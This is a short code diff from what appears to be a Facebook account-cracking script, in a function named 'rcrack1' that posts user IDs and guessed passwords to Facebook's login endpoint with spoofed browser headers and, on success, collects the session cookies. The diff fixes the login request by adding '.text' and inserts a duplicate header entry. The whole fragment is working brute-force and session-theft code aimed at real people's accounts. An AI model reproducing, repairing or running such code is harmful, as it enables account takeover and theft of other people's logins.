@@ -332,6 +332,7 @@ def rcrack1(uid,pwx,tl):
             "login":"Log In"}
             header_freefb={'authority': 'www.facebook.com',
 			'method': 'GET',
+			'scheme': 'https',
 			'path': 'https://www.facebook.com/?_rdc=1&_rdr',
 			'scheme': 'https',
 			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -346,7 +347,7 @@ def rcrack1(uid,pwx,tl):
 			'sec-fetch-site': 'same-origin',
 			'upgrade-insecure-requests': '1',
 			'user-agent': pro,}
-            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb			
+            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text			
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
